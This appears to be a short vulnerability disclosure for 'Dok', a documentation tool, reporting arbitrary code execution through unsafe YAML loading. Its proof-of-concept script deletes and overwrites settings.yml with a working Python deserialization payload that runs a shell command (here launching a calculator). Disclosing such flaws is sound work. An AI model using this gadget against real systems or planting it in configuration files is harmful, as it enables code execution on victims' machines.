# Description

`Dok` is a documentation tool/system that converts an architecture of folders and files into a static website that anyone can explore. It can be seen as a personal assistant, it invites you to write, organize and then publish your personal knowledge online. , which is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
pip3 install -r dok/requirements.txt
```

### Run exploit.py
```
import os
#os.system('pip install -r dok/requirements.txt')
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
os.system('rm -rf dok/settings.yml')
os.chdir('dok/')
open('settings.yml','w+').write(payload)
```

* `python3 exploit.py`
* `python3 dok/script.py`

# Impact

Arbitary Code Execution
